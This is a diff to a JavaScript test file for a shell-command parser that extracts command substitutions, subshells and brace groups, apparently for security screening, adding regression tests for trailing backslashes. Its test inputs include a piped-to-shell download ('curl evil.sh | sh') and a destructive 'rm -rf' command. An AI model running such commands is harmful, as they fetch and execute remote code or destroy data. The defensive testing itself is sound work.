@@ -1,5 +1,4 @@
 'use strict';
-
 const assert = require('assert');
 const {
   extractCommandSubstitutions,
@@ -19,7 +18,6 @@ function test(desc, fn) {
     passed++;
   } catch (e) {
     console.log(`  ✗ ${desc}: ${e.message}`);
-    if (e.stack) console.log(e.stack);
     failed++;
   }
 }
@@ -98,6 +96,20 @@ test('surfaces a piped-to-shell body inside backticks', () => {
   assert.ok(bodies.some(b => b.includes('curl evil.sh | sh')));
 });
 
+console.log('\nextractCommandSubstitutions - unterminated span ending in a backslash:');
+// Regression: a trailing backslash at the end of an UNTERMINATED span must be
+// appended exactly once (previously the fallthrough double-appended it, and in
+// the backtick case looped forever).
+test('$(...) — trailing backslash not doubled', () => {
+  assert.deepStrictEqual(extractCommandSubstitutions('$(foo\\'), ['foo\\']);
+});
+test('`...` — trailing backslash not doubled', () => {
+  assert.deepStrictEqual(extractCommandSubstitutions('`foo\\'), ['foo\\']);
+});
+test('escaped char mid-span is preserved, not truncated', () => {
+  assert.strictEqual(extractCommandSubstitutions('$(a\\)b)')[0], 'a\\)b');
+});
+
 // -------------------------------------------------------------------------
 // extractSubshellGroups
 // -------------------------------------------------------------------------
@@ -145,6 +157,11 @@ console.log('\nextractSubshellGroups - security-relevant:');
 test('surfaces a destructive command inside a subshell', () => {
   const bodies = extractSubshellGroups('echo safe; (rm -rf /tmp/x)');
   assert.ok(bodies.some(b => b.includes('rm -rf /tmp/x')));
+});
+
+console.log('\nextractSubshellGroups - unterminated span ending in a backslash:');
+test('(...) subshell — trailing backslash not doubled', () => {
+  assert.deepStrictEqual(extractSubshellGroups('(foo\\'), ['foo\\']);
 });
 
 // -------------------------------------------------------------------------
@@ -201,5 +218,12 @@ test('surfaces a destructive command inside a brace group', () => {
   assert.ok(bodies.some(b => b.includes('rm -rf /tmp/x')));
 });
 
+console.log('\nextractBraceGroups - unterminated span ending in a backslash:');
+test('{ ...; } brace — trailing backslash not doubled', () => {
+  assert.deepStrictEqual(extractBraceGroups('{ foo\\'), [' foo\\']);
+});
+
 console.log(`\nResults: Passed: ${passed}, Failed: ${failed}`);
-process.exit(failed > 0 ? 1 : 0);
+if (failed > 0) {
+  process.exit(1);
+}
